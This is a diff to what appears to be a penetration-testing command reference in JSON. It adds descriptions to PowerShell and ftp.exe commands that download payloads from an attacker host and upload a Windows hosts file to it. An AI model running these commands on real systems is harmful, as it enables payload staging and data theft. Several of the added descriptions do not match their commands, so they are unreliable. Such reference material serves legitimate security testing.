@@ -64,19 +64,23 @@
   "variations": [
     {
       "label": "PowerShell FTP download",
-      "command": "(New-Object Net.WebClient).DownloadFile('ftp://<lhost>/file.txt','C:\\Users\\Public\\ftp-file.txt')"
+      "command": "(New-Object Net.WebClient).DownloadFile('ftp://<lhost>/file.txt','C:\\Users\\Public\\ftp-file.txt')",
+      "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
     },
     {
       "label": "PowerShell FTP upload",
-      "command": "(New-Object Net.WebClient).UploadFile('ftp://<lhost>/ftp-hosts','C:\\Windows\\System32\\drivers\\etc\\hosts')"
+      "command": "(New-Object Net.WebClient).UploadFile('ftp://<lhost>/ftp-hosts','C:\\Windows\\System32\\drivers\\etc\\hosts')",
+      "description": "Reads the hosts file for custom hostname-to-IP mappings. Reveals internal hostnames, development servers, and network topology that DNS queries might not show."
     },
     {
       "label": "ftp.exe script - download",
-      "command": "echo open <lhost> > ftpcommand.txt\necho USER anonymous >> ftpcommand.txt\necho binary >> ftpcommand.txt\necho GET file.txt >> ftpcommand.txt\necho bye >> ftpcommand.txt\nftp -v -n -s:ftpcommand.txt"
+      "command": "echo open <lhost> > ftpcommand.txt\necho USER anonymous >> ftpcommand.txt\necho binary >> ftpcommand.txt\necho GET file.txt >> ftpcommand.txt\necho bye >> ftpcommand.txt\nftp -v -n -s:ftpcommand.txt",
+      "description": "Writes text to a file or stdout for various post-exploitation purposes (persistence, payload deployment, or file manipulation)."
     },
     {
       "label": "ftp.exe script - upload",
-      "command": "echo open <lhost> > ftpcommand.txt\necho USER anonymous >> ftpcommand.txt\necho binary >> ftpcommand.txt\necho PUT c:\\windows\\system32\\drivers\\etc\\hosts >> ftpcommand.txt\necho bye >> ftpcommand.txt\nftp -v -n -s:ftpcommand.txt"
+      "command": "echo open <lhost> > ftpcommand.txt\necho USER anonymous >> ftpcommand.txt\necho binary >> ftpcommand.txt\necho PUT c:\\windows\\system32\\drivers\\etc\\hosts >> ftpcommand.txt\necho bye >> ftpcommand.txt\nftp -v -n -s:ftpcommand.txt",
+      "description": "Writes text to a file or stdout for various post-exploitation purposes (persistence, payload deployment, or file manipulation)."
     }
   ],
   "opsec": "quiet",
